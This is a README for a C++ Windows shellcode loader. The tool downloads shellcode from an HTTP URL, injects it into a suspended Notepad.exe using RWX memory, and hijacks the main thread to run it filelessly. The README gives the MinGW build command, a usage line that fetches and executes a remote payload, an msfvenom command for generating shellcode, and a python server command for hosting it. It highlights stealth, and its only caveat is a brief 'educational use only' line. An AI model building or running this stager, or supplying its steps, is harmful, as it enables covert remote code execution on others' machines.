A simple Windows shellcode loader that downloads shellcode from a specified HTTP URL and injects it into a suspended process (`Notepad.exe`) using thread context hijacking.

## 🚀 Description

This tool demonstrates:
- Downloading remote shellcode via HTTP
- Allocating RWX memory with `VirtualAllocEx` in a suspended process
- Injecting shellcode into the suspended process's memory
- Hijacking the main thread’s context to execute shellcode (fileless execution)
- Using the `WinINet` API for stealthy network communication

> 🔐 Educational use only. Unauthorized use of this code is illegal.

## 📂 Filename

**Suspended-Process-Stager.cpp** – Console-based shellcode loader (C++)

## 📌 Technique

**In-memory shellcode execution over HTTP**

- **Download stage**: Retrieves shellcode from a remote URL
- **Memory stage**: Allocates executable memory (`PAGE_EXECUTE_READWRITE`) in a suspended process
- **Execution**: Hijacks thread context to transfer control to shellcode in the remote process

## 🧱 Requirements

- `x86_64-w64-mingw32-g++` (MinGW-w64)
- Windows target

## ⚙️ Build

```bash
x86_64-w64-mingw32-g++ Suspended-Process-Stager.cpp -o Suspended-Process-Stager.exe -static -lwininet -s -Wl,-subsystem,console
```

## 🧪 Usage

```bash
Suspended-Process-Stager.exe http://<ip_address>/shellcode.bin
```

## 🛠️ Example Shellcode Generation

Using msfvenom:
```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin
```

Serve with python:
```bash
python3 -m http.server 80
```

Then run
```bash
Suspended-Process-Stager.exe http://127.0.0.1/shellcode.bin
```
